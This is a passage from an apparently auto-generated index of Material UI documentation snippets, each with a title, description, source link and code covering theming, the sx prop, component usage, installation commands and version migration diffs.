preference.\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Purple Palette in Joy UI\nDESCRIPTION: Code snippet for adding back the removed purple palette with color values from 50 to 900\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst purple = {\n  50: '#FDF7FF',\n  100: '#F4EAFF',\n  200: '#E1CBFF',\n  300: '#C69EFF',\n  400: '#A374F9',\n  500: '#814DDE',\n  600: '#5F35AE',\n  700: '#452382',\n  800: '#301761',\n  900: '#1D0A42'\n};\n```\n\n----------------------------------------\n\nTITLE: Applying Typography Variant Styles with sx Prop in Material UI JSX\nDESCRIPTION: Illustrates using the `typography` key in the `sx` prop to apply all CSS properties defined within a specific theme typography variant (e.g., 'body1'). This applies styles like font family, size, weight, etc., associated with `theme.typography.body1`.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_14\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ typography: 'body1' }} />\n// equivalent to { ...theme.typography.body1 }\n```\n\n----------------------------------------\n\nTITLE: Theme configuration example to avoid link-underline-hover codemod\nDESCRIPTION: Example showing a theme configuration that sets the default Link underline property to 'always'. If this configuration is present, you should not run the link-underline-hover codemod.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_17\n\nLANGUAGE: js\nCODE:\n```\n// if you have theme setup like this, ❌ don't run this codemod.\n// this default props can be removed later because `always` is the default value in v5\ncreateMuiTheme({\n  components: {\n    MuiLink: {\n      defaultProps: {\n        underline: 'always',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Enabling CSS Theme Variables in Material UI JavaScript\nDESCRIPTION: This snippet shows how to enable the generation of CSS variables from theme values in Material UI v6 by setting the `cssVariables` flag to `true` within the `createTheme` function. This allows theme properties like palette, spacing, and typography to be accessed as CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({ cssVariables: true, ... });\n```\n\n----------------------------------------\n\nTITLE: Setting Flexbox Display with Material-UI Box Component in JSX\nDESCRIPTION: Demonstrates how to use the display property to create flex and inline-flex containers using the Material-UI Box component. This is the foundational property for enabling flexbox layout.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ display: 'flex' }}>…\n<Box sx={{ display: 'inline-flex' }}>…\n```\n\n----------------------------------------\n\nTITLE: Migrating InputBase Props to Slots API\nDESCRIPTION: Transforms InputBase component from using the deprecated components/componentsProps API to the new slots/slotProps API pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_48\n\nLANGUAGE: diff\nCODE:\n```\n <InputBase\n-  components={{ Input: CustomInput, Root: CustomRoot }}\n-  componentsProps={{ input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }}\n+  slots={{ input: CustomInput, root: CustomRoot }}\n+  slotProps={{ input: { id: 'test-input-id' }, root: { id: 'test-root-id' } }}\n />\n```\n\n----------------------------------------\n\nTITLE: Setting Grid Row Properties\nDESCRIPTION: Shows how to set grid row positioning using either line numbers or span values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/grid/grid.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ gridRow: '1 / 3' }}>…\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ gridRow: 'span 2' }}>…\n```\n\n----------------------------------------\n\nTITLE: ButtonGroup Classes Migration Command\nDESCRIPTION: Command line instruction for running the codemod to automatically transform ButtonGroup class names in a project.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/button-group-classes <path>\n```\n\n----------------------------------------\n\nTITLE: Updating Package Dependencies for Material UI Core\nDESCRIPTION: JSON configuration showing how to update the Material UI core dependency in package.json to version 4.0.0.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"dependencies\": {\n  \"@material-ui/core\": \"^4.0.0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Accordion Heading Level\nDESCRIPTION: Example showing how to change the default heading level of the Accordion component using slotProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/accordion/accordion.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Accordion slotProps={{ heading: { component: 'h4' } }}>\n  <AccordionSummary\n    expandIcon={<ExpandMoreIcon />}\n    aria-controls=\"panel1-content\"\n    id=\"panel1-header\"\n  >\n    Accordion\n  </AccordionSummary>\n  <AccordionDetails>\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse malesuada\n    lacus ex, sit amet blandit leo lobortis eget.\n  </AccordionDetails>\n</Accordion>\n```\n\n----------------------------------------\n\nTITLE: Disabling Built-in Filtering\nDESCRIPTION: Example showing how to disable the Autocomplete component's built-in filtering functionality by overriding the filterOptions prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete filterOptions={(x) => x} />\n```\n\n----------------------------------------\n\nTITLE: Configuring Next.js Plugin for Pigment CSS\nDESCRIPTION: JavaScript configuration for integrating the Pigment CSS plugin with Next.js, using both ES modules and CommonJS syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport { withPigment } from '@pigment-css/nextjs-plugin';\n\nconst nextConfig = {\n  // ...Your nextjs config.\n};\n\n/**\n * @type {import('@pigment-css/nextjs-plugin').PigmentOptions}\n */\nconst pigmentConfig = {\n  transformLibraries: ['@mui/material'],\n};\n\nexport default withPigment(nextConfig, pigmentConfig);\n```\n\nLANGUAGE: js\nCODE:\n```\nconst { withPigment } = require('@pigment-css/nextjs-plugin');\n\nconst nextConfig = {\n  // ...Your nextjs config.\n};\n\n/**\n * @type {import('@pigment-css/nextjs-plugin').PigmentOptions}\n */\nconst pigmentConfig = {\n  transformLibraries: ['@mui/material'],\n};\n\nmodule.exports = withPigment(nextConfig, pigmentConfig);\n```\n\n----------------------------------------\n\nTITLE: Styling Deeper Elements in Material UI Components\nDESCRIPTION: Example of customizing deeper elements within Material UI components using Tailwind CSS classes and Material UI's slotProps.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_21\n\nLANGUAGE: TypeScript\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\n\nexport default function SliderThumbOverrides() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider\n        defaultValue={30}\n        className=\"text-teal-600\"\n        slotProps={{ thumb: { className: 'rounded-sm' } }}\n      />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Replacing theme.breakpoints.width in Material-UI v5\nDESCRIPTION: This snippet demonstrates how to replace the removed theme.breakpoints.width utility with theme.breakpoints.values to get the same values in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_50\n\nLANGUAGE: diff\nCODE:\n```\n-theme.breakpoints.width('md')\n+theme.breakpoints.values.md\n```\n\n----------------------------------------\n\nTITLE: Using Experimental sx Function in Material UI Theme Overrides\nDESCRIPTION: This example demonstrates how to use the experimental unstable_sx function from the theme to apply sx-like syntax in global theme overrides for the Chip component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/callback-support-in-style-overrides.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\n\n<ThemeProvider\n  theme={createTheme({\n    components: {\n      MuiChip: {\n        styleOverrides: {\n          root: ({ theme }) =>\n            theme.unstable_sx({\n              px: '12px', // shorthand for padding-left & right\n              py: '6px', // shorthand for padding-top & bottom\n              fontWeight: 500,\n              borderRadius: '8px',\n            }),\n          label: {\n            padding: 0,\n          },\n        },\n      },\n    },\n  })}\n>\n  ...your app\n</ThemeProvider>;\n```\n\n----------------------------------------\n\nTITLE: Rendering Button Components with Global Variants in Joy UI\nDESCRIPTION: Demonstrates how to use the four global variants (solid, soft, outlined, plain) with the Button component in Joy UI. This showcases the consistency and ease of use across components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/first-look-at-joy.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<Button variant=\"solid\">\n<Button variant=\"soft\">\n<Button variant=\"outlined\">\n<Button variant=\"plain\">\n```\n\n----------------------------------------\n\nTITLE: Updating Theme Declaration Module Paths\nDESCRIPTION: Diff showing how to update theme augmentation declarations to use the correct module path and interface names for v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_6\n\nLANGUAGE: diff\nCODE:\n```\n-declare module '@mui/material/styles/createTypography' {\n+declare module '@mui/material/styles' {\n-  interface TypographyOptions {\n+  interface TypographyVariantsOptions {\n     // ...\n   }\n\n-  interface Typography {\n+  interface TypographyVariants {\n     // ...\n   }\n }\n```\n\n----------------------------------------\n\nTITLE: Change in Default theme.palette.success Colors\nDESCRIPTION: Diff showing the updated default success color palette to meet AA accessibility standards in both light and dark modes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n  success = {\n-  main: green[500],\n+  main: green[800], // green[400] in \"dark\" mode\n\n-  light: green[300],\n+  light: green[500], // green[300] in \"dark\" mode\n\n-  dark: green[700],\n+  dark: green[900], // green[700] in \"dark\" mode\n  }\n```\n\n----------------------------------------\n\nTITLE: Stack with white-space: nowrap Issue Example (JSX)\nDESCRIPTION: Shows an example of a positioning conflict that occurs when Stack children use white-space: nowrap, which can cause overflow issues.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stack/stack.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack direction=\"row\">\n  <Typography noWrap>\n```\n\n----------------------------------------\n\nTITLE: Configuring Emotion Cache with Nonce in React\nDESCRIPTION: Setting up Emotion's cache with a nonce value for CSP compliance and using CacheProvider to pass it to child components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/content-security-policy/content-security-policy.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nconst cache = createCache({\n  key: 'my-prefix-key',\n  nonce: nonce,\n  prepend: true,\n});\n\nfunction App(props) {\n  return (\n    <CacheProvider value={cache}>\n      <Home />\n    </CacheProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Timeline without Opposite Content in React\nDESCRIPTION: Illustrates a left-aligned Timeline component without opposite content.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"NoOppositeContent.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Slider Color in React\nDESCRIPTION: Shows how to customize the color of a slider component in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_10\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"ColorSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating import paths for Material UI v0.15.0\nDESCRIPTION: This codemod updates import paths to match the reorganized folder structure in Material UI v0.15.0, handling both source and npm imports.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_130\n\nLANGUAGE: diff\nCODE:\n```\n // From the source\n-import FlatButton from 'material-ui/src/flat-button';\n+import FlatButton from 'material-ui/src/FlatButton';\n\n // From npm\n-import RaisedButton from 'material-ui/lib/raised-button';\n+import RaisedButton from 'material-ui/RaisedButton';\n```\n\n----------------------------------------\n\nTITLE: Customizing Autocomplete with slotProps in JSX\nDESCRIPTION: This example shows how to add a custom data-testid attribute to the listbox slot of an Autocomplete component using the slotProps prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/overriding-component-structure/overriding-component-structure.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete slotProps={{ listbox: { 'data-testid': 'my-listbox' } }} />\n```\n\n----------------------------------------\n\nTITLE: JavaScript HTML Direction Setup\nDESCRIPTION: Alternative approach to set RTL direction using JavaScript API when direct HTML modification is not possible.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/right-to-left/right-to-left.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.documentElement.setAttribute('dir', 'rtl');\n```\n\n----------------------------------------\n\nTITLE: Setting HTML Direction Attribute via JavaScript\nDESCRIPTION: Use JavaScript to set the dir attribute on the document's root element as a workaround when direct HTML modification isn't possible.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\ndocument.documentElement.setAttribute('dir', 'rtl');\n```\n\n----------------------------------------\n\nTITLE: Customizing Picker Layout with Slots in MUI X (TypeScript)\nDESCRIPTION: This TypeScript/React code defines a custom layout component for MUI X Pickers using the slots concept, enabling advanced rearrangement and customization of subcomponents like toolbar, tabs, content, and actionBar. It uses the usePickerLayout hook to extract layout elements from the props, wraps subcomponents within styled root and content wrapper elements, and integrates with StaticDatePicker by providing a layout slot. Dependencies include React, MUI X Pickers (with PickersLayoutRoot, PickersLayoutContentWrapper, pickersLayout, usePickerLayout, StaticDatePicker), and proper setup of the MUI theming system. Inputs are layout props, and output is a customized static date picker UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v6.md#2025-04-22_snippet_3\n\nLANGUAGE: TypeScript\nCODE:\n```\nfunction MyCustomLayout(props) {\n  const { toolbar, tabs, content, actionBar } = usePickerLayout(props);\n\n  return (\n    <PickersLayoutRoot className={pickersLayout.root} ownerState={props}>\n      {toolbar}\n      {actionBar}\n      <PickersLayoutContentWrapper className={pickersLayout.contentWrapper}>\n        {tabs}\n        {content}\n      </PickersLayoutContentWrapper>\n    </PickersLayoutRoot>\n  );\n}\n\nexport default function CustomStaticDatePicker() {\n  return <StaticDatePicker slots={{ layout: MyCustomLayout }} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Tabs Variant Props\nDESCRIPTION: Removal of deprecated fullWidth and scrollable props in favor of variant prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_19\n\nLANGUAGE: diff\nCODE:\n```\n-<Tabs fullWidth scrollable />\n+<Tabs variant=\"scrollable\" />\n```\n\n----------------------------------------\n\nTITLE: Importing Display API Components from Material-UI System\nDESCRIPTION: Example of importing display-related utilities from the MUI system package. This snippet shows how to import the display module which contains various display-related properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/display/display.md#2025-04-22_snippet_8\n\nLANGUAGE: js\nCODE:\n```\nimport { display } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Converting Array-based Background Values to String-based Values\nDESCRIPTION: Example of replacing JSS array-based syntax for space- and comma-separated values with standard string-based values required by Emotion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = createTheme({\n  overrides: {\n    MuiBox: {\n      root: {\n        background: [\n          ['url(image1.png)', 'no-repeat', 'top'],\n          ['url(image2.png)', 'no-repeat', 'center'],\n          '!important',\n        ],\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: React Peer Dependencies Configuration\nDESCRIPTION: JSON configuration showing React version requirements for MUI System. Supports React versions 17, 18, and 19.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/installation/installation.md#2025-04-22_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n\"peerDependencies\": {\n  \"react\": \"^17.0.0 || ^18.0.0 || ^19.0.0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Custom Breakpoints Grid Props\nDESCRIPTION: Changes required for Grid components using custom breakpoint names.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/migrating-to-v6/migrating-to-v6.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid mobile={12} mobileOffset={2} desktop={6} desktopOffset={4}>\n+<Grid size={{ mobile: 12, desktop: 6 }} offset={{ mobile: 2, desktop: 4 }}>\n```\n\n----------------------------------------\n\nTITLE: Updating Keyboard DatePicker Imports\nDESCRIPTION: Example showing how to update the import and usage of KeyboardDatePicker to the new DatePicker component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/pickers-migration/pickers-migration.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n-import { KeyboardDatePicker } from '@material-ui/pickers';\n+import DatePicker from '@mui/lab/DatePicker';\n\n-<KeyboardDatePicker />\n+<DatePicker />\n```\n\n----------------------------------------\n\nTITLE: Applying Percentage and Pixel Widths with sx Prop in Material UI JSX\nDESCRIPTION: Illustrates how the `width` property in the `sx` prop handles fractional values (0 < value <= 1) as percentages (e.g., 1/2 becomes '50%') and other numeric values as pixels (e.g., 20 becomes '20px'), based on the internal transform function.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_10\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ width: 1/2 }} /> // equivalent to width: '50%'\n<Box sx={{ width: 20 }} /> // equivalent to width: '20px'\n```\n\n----------------------------------------\n\nTITLE: Removing Vite Icons Package Alias\nDESCRIPTION: Diff showing how to remove the Vite alias for forcing ESM imports for the icons package, which is no longer necessary in v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n // vite.config.js\n   resolve: {\n     alias: [\n-      {\n-        find: /^@mui\\/icons-material\\/(.*)/,\n-        replacement: \"@mui/icons-material/esm/$1\",\n-      },\n     ],\n   },\n```\n\n----------------------------------------\n\nTITLE: Replacing Hidden Component with sx Prop in React\nDESCRIPTION: Replaces the deprecated Hidden component with the sx prop for responsive visibility control.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_19\n\nLANGUAGE: diff\nCODE:\n```\n-<Hidden implementation=\"css\" xlUp><Paper /></Hidden>\n-<Hidden implementation=\"css\" xlUp><button /></Hidden>\n+<Paper sx={{ display: { xl: 'none', xs: 'block' } }} />\n+<Box component=\"button\" sx={{ display: { xl: 'none', xs: 'block' } }} />\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for Material-UI Sign-in Template\nDESCRIPTION: Lists the required dependencies for using the Material-UI sign-in template in a project. These include core Material-UI packages and Emotion for styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/templates/sign-in/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n@mui/material, @mui/icons-material, @emotion/styled, @emotion/react\n```\n\n----------------------------------------\n\nTITLE: List Component with Custom Root Element\nDESCRIPTION: Example of using the component prop to change the root element of a List component from ul to menu.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/composition/composition.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<List component=\"menu\">\n  <ListItem>\n    <ListItemButton>\n      <ListItemText primary=\"Trash\" />\n    </ListItemButton>\n  </ListItem>\n  <ListItem>\n    <ListItemButton>\n      <ListItemText primary=\"Spam\" />\n    </ListItemButton>\n  </ListItem>\n</List>\n```\n\n----------------------------------------\n\nTITLE: Comparing Methods for Customizing MUI TextField Border Color (TSX)\nDESCRIPTION: Compares three approaches to customizing the border color of an outlined `TextField` in MUI v5 using the `styled` API. Option 1 uses a global class name directly. Option 2 uses the same global class name but imports it via `outlinedInputClasses` for type safety. Option 3 shows the older, more verbose method using the `classes` prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_5\n\nLANGUAGE: tsx\nCODE:\n```\nimport TextField from '@mui/material/TextField';\nimport { outlinedInputClasses } from '@mui/material/OutlinedInput';\nimport { styled } from '@mui/material/styles';\n\n// Option 1: global class\nconst CustomizedTextField1 = styled(TextField)({\n  '& .MuiOutlinedInput-notchedOutline': {\n    borderColor: 'red',\n  },\n});\n\n// Option 2: global class + const\nconst CustomizedTextField2 = styled(TextField)({\n  [`& .${outlinedInputClasses.notchedOutline}`]: {\n    borderColor: 'red',\n  },\n});\n\n// Option 3: classes prop (before)\nconst CustomizedTextField3 = styled((props) => (\n  <TextField\n    {...props}\n    variant=\"outlined\"\n    InputProps={{ classes: { notchedOutline: 'foo' } }}\n  />\n))({\n  '& .foo': {\n    borderColor: 'red',\n  },\n}) as typeof TextField;\n```\n\n----------------------------------------\n\nTITLE: Updating CircularProgress Component Class Patterns in JavaScript\nDESCRIPTION: Demonstrates changes to MUI CircularProgress component class patterns. Updates the selectors to use parent component state classes with child element selectors for better composition.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_19\n\nLANGUAGE: diff\nCODE:\n```\n import { circularProgressClasses } from '@mui/material/CircularProgress';\n\n MuiCircularProgress: {\n   styleOverrides: {\n     root: {\n-      [`& .${circularProgressClasses.circleDeterminate}`]: {\n+      [`&.${circularProgressClasses.determinate} > .${circularProgressClasses.circle}`]: {\n         color: 'red',\n       },\n-      [`& .${circularProgressClasses.circleIndeterminate}`]: {\n+      [`&.${circularProgressClasses.indeterminate} > .${circularProgressClasses.circle}`]: {\n         color: 'red',\n       },\n     },\n   },\n },\n```\n\n----------------------------------------\n\nTITLE: Removing item and zeroMinWidth props in Grid v2 (Diff)\nDESCRIPTION: A diff highlighting the simplification in Grid v2 usage compared to v1. The `item` prop is no longer needed as every Grid is implicitly an item, and the `zeroMinWidth` prop is removed as text truncation is handled automatically by Grid v2.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/build-layouts-faster-with-grid-v2.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n <Grid container spacing={2}>\n-  <Grid item zeroMinWidth><Typography>Long text...</Typography></Grid>\n+  <Grid><Typography>Long text...</Typography></Grid>\n </Grid>\n```\n\n----------------------------------------\n\nTITLE: Setting Maximum Value in Badge\nDESCRIPTION: Demonstrates how to cap the maximum value displayed in a badge using the max prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\nBadgeMax.js\n```\n\n----------------------------------------\n\nTITLE: Implementing Colored Checkboxes in React\nDESCRIPTION: Demonstrates how to apply different colors to checkboxes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"ColorCheckboxes.js\"}\n```\n\n----------------------------------------\n\nTITLE: Applying Scoped CSS Baseline in React with ScopedCssBaseline\nDESCRIPTION: This code snippet shows how to use the ScopedCssBaseline component to apply baseline styles only to its children. This is useful for progressive migration or when global reset is not an option.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/css-baseline/css-baseline.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport ScopedCssBaseline from '@mui/material/ScopedCssBaseline';\nimport MyApp from './MyApp';\n\nexport default function MyApp() {\n  return (\n    <ScopedCssBaseline>\n      {/* The rest of your application */}\n      <MyApp />\n    </ScopedCssBaseline>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Grid Implementation\nDESCRIPTION: Example demonstrating a basic grid layout where an item with size={6} occupies half of the container's width.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"BasicGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI and Emotion using pnpm (Bash)\nDESCRIPTION: This command installs the `@mui/material`, `@emotion/react`, and `@emotion/styled` packages using the pnpm package manager. `@emotion/react` and `@emotion/styled` are required peer dependencies for Material UI. This snippet is presented within a tabbed `codeblock` component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/codeblock.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n```bash pnpm\npnpm add @mui/material @emotion/react @emotion/styled\n# `@emotion/react` and `@emotion/styled` are peer dependencies\n```\n```\n\n----------------------------------------\n\nTITLE: Updating Theme Typography Font Family with CSS Variable\nDESCRIPTION: A diff snippet showing how to update the theme typography font family to use the CSS variable created for Next.js font optimization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n const pigmentConfig = {\n   transformLibraries: ['@mui/material'],\n   theme: createTheme({\n+    typography: {\n+      fontFamily: 'var(--my-font-family)',\n+    },\n   }),\n };\n```\n\n----------------------------------------\n\nTITLE: Running Visual Regression Tests Commands in Material-UI\nDESCRIPTION: A set of npm commands for running visual regression tests in the Material-UI project. Includes options for full test runs, development mode, watch mode, building fixtures, and serving the fixture bundle.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/regressions/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm test:regressions        # Full run\npnpm test:regressions:dev    # Prepares the fixtures to be able to test in watchmode\npnpm test:regressions:run    # Runs the tests (requires dev or build+server)\npnpm test:regressions:build  # Builds the vite bundle for viewing the fixtures\npnpm test:regressions:server # Serves the fixture bundle.\n```\n\n----------------------------------------\n\nTITLE: Installing TSS-React Package\nDESCRIPTION: Commands for installing tss-react package using npm or yarn package managers\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nnpm install tss-react\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add tss-react\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Lab Package with npm\nDESCRIPTION: Command to install the MUI Lab package which contains experimental components and features not yet ready for the core package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/lab\n```\n\n----------------------------------------\n\nTITLE: Updating Material-UI Styles Import Path (Diff)\nDESCRIPTION: Illustrates the change in the recommended import path for Material-UI styling utilities like `makeStyles`. Starting from v4.5.1, imports should be made from `@mui/material/styles` instead of the previously used `@mui/styles` to prevent package duplication and reduce confusion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/september-2019-update.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n-import { makeStyles } from '@mui/styles';\n+import { makeStyles } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Creating CSS Variables Provider in Material UI\nDESCRIPTION: Creates a CssVarsProvider component using the unstable_createCssVarsProvider API from MUI System. This provider component will enable theme switching capabilities in the application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/css-theme-variables/css-theme-variables.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// CssVarsProvider.js\nimport { unstable_createCssVarsProvider as createCssVarsProvider } from '@mui/system';\n\nconst { CssVarsProvider, useColorScheme } = createCssVarsProvider({\n  defaultColorScheme: {\n    light: 'light',\n    dark: 'dark',\n  },\n  theme: myCustomDefaultTheme,\n});\n\nexport { CssVarsProvider, useColorScheme };\n```\n\n----------------------------------------\n\nTITLE: Customizing Breadcrumbs in React\nDESCRIPTION: Illustrates how to customize the Breadcrumbs component, allowing for more advanced styling and behavior modifications.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomizedBreadcrumbs.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Shadow Ring in Joy UI Theme\nDESCRIPTION: Shows how to customize the shadow ring for both light and dark color schemes in the Joy UI theme. The shadow ring creates a consistent outline effect for shadowed elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-shadow/theme-shadow.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  